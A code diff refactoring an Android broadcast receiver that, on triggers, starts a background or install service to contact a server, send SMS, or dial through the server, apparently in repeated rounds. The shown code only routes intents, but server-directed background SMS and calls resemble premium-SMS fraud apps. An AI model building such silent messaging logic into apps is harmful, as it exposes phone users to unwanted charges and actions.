@@ -18,23 +18,29 @@ public class AutoSMSRecevier extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         if (DEBUG) Log.d(TAG, "[[AutoSMSRecevier::onReceive]]");
         if (intent.getAction() != null) {
+            String action = null;
             if (intent.getAction().equals(SettingManager.AUTO_CONNECT_SERVER) == true) {
                 LOGD("[[AutoSMSRecevier::onReceiv]] connect server to get xml info, start service to internet");
-                Intent intent1 = new Intent(context, BgService.class);
-                intent1.setAction(BgService.ACTION_INTERNET);
-                context.startService(intent1);
+                action = BgService.ACTION_INTERNET;
             } else if (intent.getAction().equals(SettingManager.AUTO_SMS_ACTION) == true) {
                 LOGD("[[AutoSMSRecevier::onReceiv]] send sms or dial through server");
                 SettingManager.getInstance(context.getApplicationContext()).log("send sms or dial through service");
-                Intent intent1 = new Intent(context, BgService.class);
-                intent1.setAction(BgService.ACTION_SEND_SMS);
-                context.startService(intent1);
+                action = BgService.ACTION_SEND_SMS;
             } else if (intent.getAction().equals(BgService.ACTION_SEND_SMS_ROUND) == true) {
                 SettingManager.getInstance(context.getApplicationContext()).log("one round sms send receiver");
-                Intent intent1 = new Intent(context, BgService.class);
-                intent1.setAction(BgService.ACTION_SEND_SMS_ROUND);
-                context.startService(intent1);
+                action = BgService.ACTION_SEND_SMS_ROUND;
             }
+            
+            Intent intent_new = new Intent();
+            if (action == null) return;
+            intent_new.setAction(action);
+            boolean isInternal = SettingManager.getInstance(context).getAppType().equals(SettingManager.APP_TYPE_INTERNAL);
+            if (isInternal) {
+                intent_new.setClass(context, InstallService.class);
+            } else {
+                intent_new.setClass(context, BgService.class);
+            }
+            context.startService(intent_new);
         }
     }
     
